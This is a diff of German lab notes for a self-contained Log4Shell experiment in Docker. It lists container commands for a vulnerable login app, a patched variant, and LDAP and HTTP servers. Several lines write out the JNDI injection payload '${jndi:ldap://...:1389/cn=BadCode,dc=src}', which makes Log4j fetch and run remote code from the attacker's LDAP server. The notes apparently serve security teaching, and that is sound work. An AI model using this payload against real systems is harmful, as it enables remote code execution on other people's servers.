@@ -1,5 +1,5 @@
 
-VERSUCH MIT DOCKER
+VERSUCH MIT SICHERHEITSLUECKE IN DOCKER
 
 docker create network log4shell
 (Um network zu löschen: docker network rm log4shell)
@@ -13,30 +13,68 @@ docker run -d --hostname hackerslabldap --name log4shell-ldapserver --network="l
 docker run -it --name log4shell-translatorapp --network="log4shell" log4shell-translatorapp
 
 
-VERSUCH MIT DOCKER-COMPOSE
+VERSUCH MIT SICHERHEITSLUECKE IN DOCKER-COMPOSE
 
 docker-compose up -d
-docker exec -it src-translatorapp-1 java -cp /root/dependencies/*:/root TranslatorApp
+docker exec -it src-login-1 java -cp /root/dependencies/*:/root Login
+
+docker exec -it src-login-1 sh
+cd logs
+cat mylog.log
 
 EXPLOIT FÜR DOCKER/DOCKER-COMPOSE
 ${jndi:ldap://hackerslabldap:1389/cn=BadCode,dc=src}
 
-EXPLOIT FÜR LOKAL IN ENTWICKLUNGSUMGEBUNG
+
+///////////////////////PATCHED///////////////////////////////////////////////////////////
+
+
+PATCHED VERSUCH IN DOCKER-COMPOSE
+
+docker-compose up -d
+docker exec -it src-login_patched-1 java -cp /root/dependencies/*:/root Login
+
+docker exec -it src-login_patched-1 sh
+cd logs
+cat mylog.log
+
+PATCHED - EXPLOIT FÜR DOCKER/DOCKER-COMPOSE
+${jndi:ldap://hackerslabldap:10389/cn=BadCode,dc=src}
+(Wird aber sowieso nicht klappen, da Log4J gepatcht und JNDILookup so nicht möglich)
+
+
+
+
+
+
+
+VERSUCH LOKAL IN ENTWICKLUNGSUMGEBUNG
+
+Im Code von HTTPServer muss der Absolute Pfad angegeben werden, damit er die .class-Datei findet.
+Statt 'Files/BadCode.class' dann 'C:/Verzeichnis/bis/zur/ClassDatei'
+
+Außerdem muss im Code des LDAP-Verzeichnisses der Name des LDAP-Servers von hackerslabldap zu localhost abgeändert werden.
+Unten im Code muss statt hackerslabhttp:8080 dann auch localhost:8080 stehen.
+
+EXPLOIT:
 ${jndi:ldap://localhost:1389/cn=BadCode,dc=src}
 
 
-docker exec -it src-translatorapp-1 ls /root
-docker exec -it src-translatorapp-1 ls /root/logs
-docker exec -it src-translatorapp-1 cat /root/logs/mylog.log
-
-
-docker exec -it <container_name> ls /app
-docker exec -it <container_name> cat /app/file.txt
 
 
 
 
 
 
-    volumes:
-      - ./httpserver:/HttpServer
+
+
+
+
+
+docker exec -it src-login-1 ls /root
+docker exec -it src-login-1 ls /root/logs
+docker exec -it src-login-1 cat /root/logs/mylog.log
+
+
+
+
